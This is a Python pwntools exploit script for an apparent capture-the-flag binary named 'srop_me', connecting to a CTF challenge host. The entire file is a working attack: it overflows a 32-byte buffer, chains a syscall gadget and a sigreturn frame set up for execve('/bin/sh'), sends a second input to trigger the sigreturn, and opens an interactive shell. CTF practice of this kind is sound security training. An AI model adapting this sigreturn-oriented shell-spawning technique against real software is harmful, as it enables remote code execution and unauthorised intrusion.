#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF(args.EXE or 'srop_me')
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 38894)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b _start
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

io = start()

syscall = 0x401047 # syscall; ret
vuln_function  = 0x401000 # vuln func
binsh = 0x40200f # program address to /bin/sh

frame = SigreturnFrame(kernel="amd64")
frame.rax = 59 #execve for syscall table
frame.rdi =  binsh #/bin/sh memory segment
frame.rsi = 0 #sh address
frame.rdx = 0 #zerod out
frame.rip = syscall #Calling the syscall in the end


# actual payload sending
payload1 = b"A"*32
payload1 += p64(vuln_function)
payload1 += p64(syscall)
payload1 += bytes(frame)
io.sendlineafter(b'world!!', payload1)

payload2 = b"C"*14
io.sendlineafter(b'world!!', payload2)

io.interactive()
